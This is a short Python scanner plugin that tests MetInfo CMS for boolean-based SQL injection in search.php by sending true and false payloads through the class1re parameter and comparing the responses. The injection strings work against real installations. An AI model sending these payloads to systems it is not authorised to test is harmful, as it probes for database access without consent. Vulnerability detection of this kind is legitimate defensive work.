#!/usr/bin/env python
"""
    author: codier 
    time:2015-07-024
"""
import re
def assign(service, arg):
    if service == "metinfo":
        return True, arg

def audit(arg):
    url = arg
    payload_and_true = 'search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=e327b894f7c7782b9a3ce3697556902a&lang=cn&class1re=)%20and%201--%20sd'
    payload_and_false = 'search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=e327b894f7c7782b9a3ce3697556902a&lang=cn&class1re=)%20and%200--%20sd'
    #test false
    code, head, res, errcode, _ = curl.curl(url + payload_and_false)
    if code == 200:
        m = re.findall("e327b894f7c7782b9a3ce3697556902a", res)
        if len(m) == 3:
            #test true
            code, head, res, errcode, _ = curl.curl(url + payload_and_true)
            if code == 200:
                m = re.findall("e327b894f7c7782b9a3ce3697556902a", res)
                if len(m) == 2:
                    security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://localhost/metinfo/')[1])